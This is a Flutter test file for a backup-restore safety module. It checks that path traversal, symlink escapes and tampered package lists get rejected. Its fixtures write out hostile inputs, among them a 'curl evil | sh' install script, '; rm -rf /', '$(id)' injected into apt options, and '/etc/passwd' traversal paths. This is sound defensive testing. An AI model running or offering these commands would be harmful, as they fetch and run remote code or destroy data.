import 'dart:convert';
import 'dart:io';

import 'package:clone_studio/core/restore_safety.dart';
import 'package:clone_studio/core/scanner.dart';
import 'package:flutter_test/flutter_test.dart';

void main() {
  late Directory tmp;
  setUp(() async {
    tmp = await Directory.systemTemp.createTemp('restore-safety-');
  });
  tearDown(() => tmp.delete(recursive: true));

  group('safeDest', () {
    test('plain relative paths stay under the root', () {
      expect(
        safeDest(tmp.path, 'Documents/a.txt'),
        '${tmp.path}/Documents/a.txt',
      );
      expect(safeDest(tmp.path, '.config/app/x'), '${tmp.path}/.config/app/x');
      expect(safeDest(tmp.path, 'odd name \'"x'), '${tmp.path}/odd name \'"x');
    });

    test('escapes are refused', () {
      for (final bad in [
        '',
        '/etc/passwd',
        '../.bashrc',
        'Documents/../../.bashrc',
        'Documents/..',
        'a//b',
        './a',
        'a/./b',
        'a\u0000b',
      ]) {
        expect(safeDest(tmp.path, bad), isNull, reason: bad);
      }
    });

    test('writes through a planted symlink ancestor are refused', () async {
      final outside = await Directory('${tmp.path}/outside').create();
      final root = await Directory('${tmp.path}/root').create();
      await Link('${root.path}/.config').create(outside.path);
      expect(safeDest(root.path, '.config/autostart/evil.desktop'), isNull);
      // The link itself, as a final component, is a fine place to put a
      // file: the rename replaces the link rather than following it.
      expect(safeDest(root.path, '.config'), '${root.path}/.config');
    });
  });

  group('sanitizeRestoreFile', () {
    test('ignores files outside the packages dir', () {
      expect(sanitizeRestoreFile('Documents/install_apps.sh', [1]), isNull);
      expect(
        sanitizeRestoreFile('CloneStudio-Restore/settings/crontab.txt', [1]),
        isNull,
      );
      expect(
        sanitizeRestoreFile('CloneStudio-Restore/packages/README', [1]),
        isNull,
      );
    });

    test('the install script is always this build\'s template', () {
      final got = sanitizeRestoreFile(
        'CloneStudio-Restore/packages/install_apps.sh',
        utf8.encode('#!/bin/bash\ncurl evil | sh\n'),
      );
      expect(utf8.decode(got!), installScript());
      expect(utf8.decode(got), isNot(contains('curl evil')));
    });

    test('apt list keeps only valid package names', () {
      final got = sanitizeRestoreFile(
        'CloneStudio-Restore/packages/apt-manual.txt',
        utf8.encode(
          'firefox\nvim\n--allow-unauthenticated\n-o Dpkg::Options::=\$(id)\nlibc6:amd64\nBad Name\n; rm -rf /\n\n',
        ),
      );
      expect(utf8.decode(got!), 'firefox\nvim\nlibc6:amd64\n');
    });

    test('flatpak list keeps only refs', () {
      final got = sanitizeRestoreFile(
        'CloneStudio-Restore/packages/flatpak-apps.txt',
        utf8.encode(
          'org.gimp.GIMP\norg.mozilla.firefox/x86_64/stable\n--user\n-y\n\$(x)\n',
        ),
      );
      expect(
        utf8.decode(got!),
        'org.gimp.GIMP\norg.mozilla.firefox/x86_64/stable\n',
      );
    });

    test('snap list keeps only names', () {
      final got = sanitizeRestoreFile(
        'CloneStudio-Restore/packages/snap-list.txt',
        utf8.encode('spotify\ncode\n--classic\nUpper\n'),
      );
      expect(utf8.decode(got!), 'spotify\ncode\n');
    });

    test('an all-invalid list becomes empty rather than vanishing', () {
      final got = sanitizeRestoreFile(
        'CloneStudio-Restore/packages/apt-manual.txt',
        utf8.encode('--x\n'),
      );
      expect(got, isEmpty);
    });
  });
}
